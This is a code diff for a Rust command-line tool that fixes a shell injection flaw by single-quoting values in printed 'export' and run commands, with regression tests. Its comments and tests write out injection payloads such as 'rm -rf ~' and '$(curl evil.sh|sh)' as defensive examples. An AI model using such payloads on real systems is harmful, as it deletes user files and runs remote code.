@@ -425,12 +425,29 @@ fn agent_env(proxy: &str) -> Vec<(&'static str, String)> {
     vars
 }
 
+/// Quotes `value` for safe inclusion in a POSIX shell command line.
+///
+/// Single-quotes the whole value and escapes any embedded single quote as `'\''`
+/// (close the quote, an escaped literal quote, reopen) — the one fully general POSIX
+/// quoting rule; double quotes still leave `$`, `` ` ``, and `\` live inside them.
+///
+/// # Why this exists
+///
+/// `headroom env`/`headroom wrap`'s whole documented usage is
+/// `eval "$(headroom env)"` / `eval "$(headroom wrap {agent} --proxy {proxy})"`.
+/// Printing `export NAME={value}` unquoted made a `--proxy` value containing shell
+/// metacharacters (`http://x; rm -rf ~`, `` http://x$(curl evil.sh|sh) ``, ...) execute
+/// the moment that documented usage pattern ran it.
+fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', r"'\''"))
+}
+
 /// `headroom env`.
 pub fn env(proxy: &str) -> anyhow::Result<()> {
     // Emitted as shell exports so this can be `eval`'d, which is how the reference's
     // wrap command is meant to be used.
     for (name, value) in agent_env(proxy) {
-        println!("export {name}={value}");
+        println!("export {name}={}", shell_quote(&value));
     }
     println!("# eval \"$(headroom env)\" then run your agent as usual");
     Ok(())
@@ -1224,6 +1241,38 @@ mod tests {
         // an export must be commented, or `eval` fails.
         assert!(env("http://127.0.0.1:8787").is_ok());
     }
+
+    #[test]
+    fn shell_quote_neutralizes_command_substitution_and_separators() {
+        // Regression. `env`/`wrap`'s whole documented usage is `eval "$(headroom
+        // env)"`, and this used to print `export NAME={value}` with no quoting at
+        // all -- a `--proxy` value carrying `; rm -rf ~` or `$(curl evil.sh|sh)`
+        // executed the moment that documented usage pattern ran it. Wrapped in a
+        // single un-embedded pair of single quotes, a POSIX shell treats the whole
+        // payload as one literal word rather than as syntax.
+        assert_eq!(shell_quote("http://x; rm -rf ~"), "'http://x; rm -rf ~'");
+        assert_eq!(
+            shell_quote("http://x$(curl evil.sh|sh)"),
+            "'http://x$(curl evil.sh|sh)'"
+        );
+
+        for (_, value) in agent_env("http://x; rm -rf ~$(id)`id`") {
+            let quoted = shell_quote(&value);
+            assert!(
+                quoted.starts_with('\'') && quoted.ends_with('\''),
+                "{quoted}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_quote_escapes_an_embedded_single_quote() {
+        assert_eq!(shell_quote("it's here"), r"'it'\''s here'");
+        // The escaped form, fed back through a shell, reads as the original text --
+        // verified structurally rather than by shelling out: close-quote,
+        // escaped-literal-quote, reopen-quote is the standard POSIX idiom.
+        assert_eq!(shell_quote("a'b'c"), r"'a'\''b'\''c'");
+    }
 }
 
 /// `headroom wrap <agent>` — print the environment that routes an agent through the
@@ -1284,7 +1333,7 @@ pub fn wrap(agent: &str, proxy: &str, settings: Option<&std::path::Path>) -> any
     let exports = agent.env(proxy);
     let mut stdout = std::io::stdout().lock();
     for (name, value) in &exports {
-        writeln!(stdout, "export {name}={value}")?;
+        writeln!(stdout, "export {name}={}", shell_quote(value))?;
     }
     stdout.flush()?;
 
@@ -1709,7 +1758,9 @@ fn deploy_manifests(port: u16, upstream: &str, binary: &str) -> String {
 
     out.push_str("# Run it directly\n");
     out.push_str(&format!(
-        "HEADROOM_PORT={port} HEADROOM_UPSTREAM={upstream} {binary}\n\n"
+        "HEADROOM_PORT={port} HEADROOM_UPSTREAM={} {}\n\n",
+        shell_quote(upstream),
+        shell_quote(binary)
     ));
 
     out.push_str("# systemd user unit — ~/.config/systemd/user/headroom.service\n");
